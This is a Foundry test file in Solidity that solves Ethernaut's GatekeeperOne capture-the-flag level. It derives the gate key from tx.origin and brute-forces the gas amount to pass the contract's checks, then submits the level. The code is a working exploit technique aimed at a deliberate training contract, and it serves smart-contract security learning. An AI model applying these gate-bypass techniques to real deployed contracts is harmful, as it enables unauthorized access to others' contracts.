// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// testing functionalities
import "forge-std/Test.sol";

// Ethernaut game components
import "src/levels/13-GatekeeperOne/GatekeeperOneFactory.sol";
import "src/levels/13-GatekeeperOne/GatekeeperOneAttack.sol";
import "src/core/Ethernaut.sol";

contract GatekeeperOneTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;

    address attacker = makeNameForAddress("attacker");

    function setUp() public {
        emit log_string("Setting up GatekeeperOne level...");
        ethernaut = new Ethernaut();
        // We need to give attacker some funds to attack the contract
        vm.deal(attacker, 10 wei);
    }

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function test_GatekeeperOneExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();

        ethernaut.registerLevel(gatekeeperOneFactory);
        vm.startPrank(attacker);

        address levelAddress = ethernaut.createLevelInstance(
            gatekeeperOneFactory
        );

        GatekeeperOne gatekeeperOneContract = GatekeeperOne(levelAddress);

        emit log_string("Starting the exploit... ");
        emit log_named_address("Attacker's address", attacker);
        emit log_named_address("Ethernaut's address", address(ethernaut));
        emit log_named_address(
            "Factory's address",
            address(gatekeeperOneFactory)
        );
        emit log_named_address(
            "Instance's address",
            address(gatekeeperOneContract)
        );
        // it turns out that there is a default value for tx.origin
        // set up by Foundry
        // 0x00a329c0648769a73afac7f9381e08fb43dbea72
        // this is the reason why this script was not working for Eve
        // she is not the tx.origin
        // Test contract is
        // startPrank sets msg.sender not tx.origin
        // it is possible to set tx.origin tho, but its buggy as hell
        emit log_named_address("This is tx.origin: ", tx.origin);

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/

        GatekeeperOneAttack gatekeeperOneAttack = new GatekeeperOneAttack(
            address(gatekeeperOneContract)
        );

        // GATE 3 condition 3
        uint64 _gateKeyUint = uint64(1 << 63) + uint64(uint16(tx.origin));
        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_string("_gateKeyUint = ");
        console.log(_gateKeyUint);
        emit log_string(
            "--------------------------------------------------------------------------"
        );

        bytes8 _gateKey = bytes8(_gateKeyUint);
        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_string("_gateKey = ");
        console.logBytes8(_gateKey);
        emit log_string(
            "--------------------------------------------------------------------------"
        );

        // GATE 3 condition 2
        uint256 _gasAmount;

        for (uint256 i = 0; i <= 10000; i++) {
            try gatekeeperOneContract.enter{gas: 8191 * 10 + i}(_gateKey) {
                console.log("passed with gas ->", 8191 * 10 + i);
                _gasAmount = 8191 * 10 + i;

                break;
            } catch {}
        }

        // GATE 3 condition
        gatekeeperOneAttack.attack(_gateKey, _gasAmount);

        emit log_named_address(
            "Address of the entrant: ",
            gatekeeperOneContract.entrant()
        );

        assertEq(gatekeeperOneContract.entrant(), tx.origin);

        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        // assert(challengeCompleted);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * I've found this useful function
     * in github/twpony Ethernaut repo
     * @notice This function allows for creating labels (names) for addresses
     * which will improve readability in traces
     * @param name you pass the name like "alice" or "bob" and it will create
     * an address for that person
     */
    function makeNameForAddress(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
